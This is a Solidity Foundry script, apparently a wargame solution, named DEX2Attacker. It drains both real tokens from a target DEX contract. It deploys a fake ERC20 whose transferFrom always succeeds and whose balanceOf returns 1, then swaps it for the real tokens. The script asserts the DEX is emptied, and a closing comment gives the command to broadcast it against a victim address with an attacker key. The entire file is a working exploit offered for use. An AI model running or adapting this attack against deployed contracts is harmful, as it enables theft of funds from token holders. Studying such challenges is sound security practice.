// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../lib/forge-std/src/Script.sol";
import {HelperConfigLib} from "./config/HelperConfig.sol";

interface IERC20 {
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function balanceOf(address account) external view returns (uint256);
}

interface IDEX {
    function swap(address from, address to, uint256 amount) external;

    // function approve(address spender, uint256 amount) external;

    function balanceOf(
        address token,
        address account
    ) external view returns (uint256);

    function token1() external view returns (address);

    function token2() external view returns (address);
}

contract DEX2Attacker is Script, HelperConfigLib {
    function run(address _vulnerableContract) external {
        vm.startBroadcast(ATTACKER_KEY);
        IDEX vulnerableDEX = IDEX(_vulnerableContract);

        FakeERC20 myFakeERC20 = new FakeERC20();

        address realToken1 = vulnerableDEX.token1();
        address realToken2 = vulnerableDEX.token2();

        vulnerableDEX.swap(address(myFakeERC20), realToken2, 1);

        vulnerableDEX.swap(address(myFakeERC20), realToken1, 1);

        require(
            vulnerableDEX.balanceOf(realToken1, address(vulnerableDEX)) == 0,
            "vulnerableDEX still got some token1"
        );
        require(
            vulnerableDEX.balanceOf(realToken2, address(vulnerableDEX)) == 0,
            "vulnerableDEX still got some token2"
        );

        vm.stopBroadcast();
    }
}

contract FakeERC20 is IERC20 {
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public returns (bool) {
        return true;
    }

    function balanceOf(address account) public view returns (uint256) {
        return 1;
    }
}

/*
forge script script/DEX2Attacker.s.sol:DEX2Attacker --sig "run(address)" <VICTIM-ADDRESS> -vvv --broadcast --rpc-url <RPC-URL>

 */
